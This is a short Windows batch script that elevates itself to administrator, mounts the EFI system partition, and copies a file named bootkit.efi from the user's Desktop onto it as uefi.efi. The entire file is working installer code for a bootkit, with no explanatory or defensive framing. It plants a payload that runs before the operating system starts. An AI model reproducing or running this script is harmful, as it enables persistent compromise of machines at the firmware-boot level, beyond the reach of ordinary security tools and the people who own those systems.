@echo off
whoami /priv | find "SeDebugPrivilege" > nul
if %errorlevel% neq 0 (
 @powershell start-process %~0 -verb runas
 exit
)

setlocal

set FileName=bootkit.efi
set UefiName=uefi.efi
set FilePath=%USERPROFILE%\Desktop\%FileName%

mountvol.exe S: /S    

move %FilePath% S:\%UefiName%
    
mountvol.exe S: /D

endlocal